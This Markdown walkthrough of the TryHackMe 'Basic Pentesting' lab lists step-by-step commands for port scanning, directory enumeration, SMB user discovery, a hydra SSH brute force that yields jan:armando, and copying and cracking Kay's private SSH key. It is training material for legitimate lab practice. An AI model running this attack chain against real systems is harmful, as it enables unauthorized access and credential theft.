# TryHackMe Basic Pentesting - Complete Walkthrough

![TryHackMe](https://img.shields.io/badge/TryHackMe-Basic%20Pentesting-red?style=for-the-badge&logo=tryhackme)
![Difficulty](https://img.shields.io/badge/Difficulty-Easy-green?style=for-the-badge)
![Category](https://img.shields.io/badge/Category-Boot2Root-blue?style=for-the-badge)

## 📋 Table of Contents
- [Overview](#overview)
- [Task 1: Service Discovery](#task-1-service-discovery)
- [Task 2: Directory Enumeration](#task-2-directory-enumeration)
- [Task 3: User Discovery & Brute Force](#task-3-user-discovery--brute-force)
- [Task 4: Privilege Escalation](#task-4-privilege-escalation)
- [Key Learnings](#key-learnings)
- [Tools Used](#tools-used)

## 🎯 Overview
Basic Pentesting is an easy-level room focusing on fundamental penetration testing methodologies:
- Service enumeration and discovery
- Directory and file brute forcing
- SMB enumeration for user discovery
- SSH brute force attacks
- Linux privilege escalation via SSH keys

## 🔍 Task 1: Service Discovery

### 🌐 Port Scanning
```bash
nmap -sC -sV -oN nmap_scan.txt <TARGET_IP>
```

**🎯 Expected Services:**
- **SSH** (Port 22) - OpenSSH service
- **HTTP** (Port 80) - Web server
- **SMB** (Port 139/445) - Samba file sharing
- **Other services** may be present

**📝 Key Findings:**
Document all open ports and their versions for further exploitation.

## 🕸️ Task 2: Directory Enumeration

### 📁 Web Directory Discovery
```bash
gobuster dir -u http://<TARGET_IP> -w /usr/share/seclists/Discovery/Web-Content/big.txt -o gobuster_results.txt -t 100
```

**🔑 Target Directory:**
- **Answer:** `development`

**💡 Discovery Method:**
- Use directory enumeration tools like Gobuster
- Check for common directories and hidden paths
- Look for development, admin, or backup directories

### 🔍 Additional Enumeration
```bash
# Check for robots.txt and sitemap.xml
curl http://<TARGET_IP>/robots.txt
curl http://<TARGET_IP>/sitemap.xml

# Examine page source
curl -s http://<TARGET_IP> | grep -i "hidden\|comment\|password"
```

## 👥 Task 3: User Discovery & Brute Force

### 🔍 SMB Enumeration
```bash
enum4linux <TARGET_IP>
```

**👤 Discovered Users:**
- **User 1:** `jan`
- **User 2:** `kay`

### 🔐 SSH Brute Force Attack
```bash
hydra -l jan -P /usr/share/wordlists/rockyou.txt ssh://<TARGET_IP> -t 4 -V
```

**🎯 Results:**
- **Username:** `jan`
- **Password:** `armando`
- **Service:** `SSH`

**💡 Pro Tips:**
- Always try common usernames first (admin, user, test, etc.)
- Use targeted wordlists based on context clues
- Monitor failed login attempts to avoid account lockouts

## 🚀 Task 4: Privilege Escalation

### 🐚 Initial Access
```bash
ssh jan@<TARGET_IP>
```

### 🔍 Enumeration with LinPEAS
```bash
# On attacker machine
wget https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh

# Transfer to target
scp linpeas.sh jan@<TARGET_IP>:/tmp/

# On target machine
chmod +x /tmp/linpeas.sh
./tmp/linpeas.sh
```

### 🔑 SSH Key Discovery
**🎯 Key Finding:** LinPEAS discovers SSH private key under Kay's directory
```bash
# Found location
/home/kay/.ssh/id_rsa
```

### 🔓 SSH Key Cracking
```bash
# Copy the private key to attacker machine
scp jan@<TARGET_IP>:/home/kay/.ssh/id_rsa ./kay_id_rsa

# Convert for John the Ripper
ssh2john.py kay_id_rsa > kay_id_rsa.hash

# Crack the passphrase
john --wordlist=/usr/share/wordlists/rockyou.txt kay_id_rsa.hash
```

**🎉 Results:**
- **SSH Key Passphrase:** `beeswax` (example result)

### 🏆 Final Access
```bash
# Set proper permissions
chmod 600 kay_id_rsa

# Connect as Kay
ssh -i kay_id_rsa kay@<TARGET_IP>

# Find the final flag
cat /home/kay/pass.bak
```

**🏁 Final Password:** Found in `pass.bak` file

## 📚 Key Learnings

### 🔍 Enumeration Methodology
- **Always start comprehensive** - Scan all ports and services
- **Directory enumeration is crucial** - Hidden directories often contain sensitive information
- **Multiple attack vectors** - Combine web, SMB, and SSH enumeration

### 🛡️ SMB Security
- **enum4linux** is powerful for discovering users on SMB shares
- **Default configurations** often expose user information
- **Samba misconfigurations** can lead to information disclosure

### 🔐 Brute Force Techniques
- **SSH brute forcing** can be effective against weak passwords
- **Rate limiting awareness** - Use appropriate thread counts to avoid detection
- **Targeted attacks** work better than broad wordlist attacks

### 🚀 Privilege Escalation
- **SSH keys** are common privilege escalation vectors
- **LinPEAS automation** saves time in enumeration
- **John the Ripper** is essential for cracking password-protected keys

### 🎯 General Methodology
1. **🔍 Reconnaissance** - Port scanning and service identification
2. **🕸️ Web enumeration** - Directory and file discovery
3. **👥 User discovery** - SMB/LDAP enumeration for users
4. **🔐 Credential attacks** - Brute force weak passwords
5. **📈 Privilege escalation** - SSH keys, SUID binaries, or misconfigurations

## 🛠️ Tools Used
- `nmap` - Port scanning and service enumeration
- `gobuster` - Directory and file brute forcing
- `enum4linux` - SMB enumeration and user discovery
- `hydra` - SSH brute force attacks
- `linPEAS` - Automated privilege escalation enumeration
- `ssh2john.py` - Convert SSH keys for John the Ripper
- `john` - Password cracking for SSH key passphrases
- `scp` - Secure file transfer

## 🎯 Attack Chain Summary
```
1. Port Scan → Services Discovery
2. Web Enum → /development directory
3. SMB Enum → Users (jan, kay)
4. SSH Brute Force → jan:armando
5. LinPEAS → Kay's SSH key discovery
6. SSH Key Crack → Key passphrase
7. SSH as Kay → Final flag
```

---

> **💡 Pro Tip:** This room demonstrates the importance of layered security. Each service (SMB, SSH, Web) provided a different piece of the puzzle needed for complete compromise.

**Author:** Your Security Notes  
**Date:** Created for TryHackMe Basic Pentesting Room  
**Difficulty:** Easy  
**Tags:** `#tryhackme` `#pentesting` `#ssh` `#smb` `#bruteforce` `#privesc`
